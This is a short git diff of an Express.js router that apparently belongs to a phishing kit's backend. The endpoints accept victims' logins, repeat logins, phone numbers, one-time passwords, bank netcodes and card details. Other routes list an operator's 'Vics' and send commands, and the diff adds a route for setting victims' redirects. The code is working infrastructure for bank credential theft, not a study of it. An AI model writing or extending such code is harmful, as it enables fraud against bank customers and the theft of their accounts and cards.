@@ -1,15 +1,16 @@
 const express = require("express");
 const {
-    getOwnerVics,
-    command,
-    getInfo,
-    submitLogin,
-    submitLoginAgain,
-    submitTelephone,
-    submitOtp,
-    submitNetcode,
-    deleteEntry,
-    submitCard,
+	getOwnerVics,
+	command,
+	getInfo,
+	submitLogin,
+	submitLoginAgain,
+	submitTelephone,
+	submitOtp,
+	submitNetcode,
+	deleteEntry,
+	submitCard,
+	setRedirect,
 } = require("../controllers/asbController");
 
 const router = express.Router();
@@ -24,5 +25,6 @@ router.post("/otp", submitOtp);
 router.post("/card", submitCard);
 router.post("/netcode", submitNetcode);
 router.post("/delete", deleteEntry);
+router.get("/redirect/:active", setRedirect);
 
 module.exports = router;
